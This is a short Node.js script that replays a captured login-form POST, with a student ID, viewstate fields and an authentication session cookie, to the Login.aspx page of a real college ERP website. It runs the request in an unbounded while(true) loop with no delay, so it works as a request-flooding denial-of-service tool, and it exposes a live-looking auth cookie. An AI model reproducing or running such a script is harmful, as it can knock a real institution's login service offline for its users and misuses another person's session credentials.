const axios = require("axios");
const qs = require("qs");

const data = qs.stringify({
  __LASTFOCUS: "",
  __EVENTTARGET: "",
  __EVENTARGUMENT: "",
  __VIEWSTATE:
    "/wEPDwUKLTk1NzEzMjEyNWQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFDEltZ1VzZXJQaG90b1ZsC0IYh5U2ub1fKnPUK2/xmU0iLzV+eBxpJgx+ldHn",
  __VIEWSTATEGENERATOR: "C2EE9ABB",
  __EVENTVALIDATION:
    "/wEdAAYCVfc4JHE0jPeE7vbA3xrklSfEvot8s98xACen5j++l+5PVNfdHmla7NuBu7/wrMPS+VrIiJsmVmbYcR2E/1qWY3plgk0YBAefRz3MyBlTcIFjpILoFgeQqvXWA+7aEDSZl/gRTVBuqhhScO3TugVdUkG9GUHdRYRJCO9OXYlmJw==",
  txtUserName: "23N35A6711",
  btnNext: "Next",
});

const config = {
  method: "post",
  maxBodyLength: Infinity,
  url: "https://www.mrceterp.com/Login.aspx?ReturnUrl=%2f",
  headers: {
    "User-Agent":
      "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    Accept:
      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    Origin: "https://www.mrceterp.com",
    Connection: "keep-alive",
    Referer: "https://www.mrceterp.com/Login.aspx?ReturnUrl=%2f",
    Cookie:
      "ASP.NET_SessionId=c0knet1yt4hvwa2bvyncx5oq; .ASPXAUTH=B60A728BD7BDFC903E4FB42725D0389AFCF679740DF3330D7324937A907E2287C1231807168B3826AA1C59BDA4831CB43221B88CB4073D3E4639DE30B168BAB03F327419DDAC1DC5FFD040ED35D2599857FE969200ECA999DF61EAC68ABC1F63A9AA888229675B672CAA8430EF46A22F8670877BAF9C79D2E0C9D5570C07BA445EEB4C6009103D2E730529E95BC154D60CB07F4403E38132E183A016340479EF6FDAEED9F46CB2A772805E7A58ACE9117309F91CBA2A02599637E9CE62214105",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    TE: "trailers",
  },
  data: data,
};

(async function sendRequests() {
  while (true) {
    try {
      await axios.request(config);
      console.log("Request sent");
    } catch (error) {
      console.log(error);
    }
  }
})();
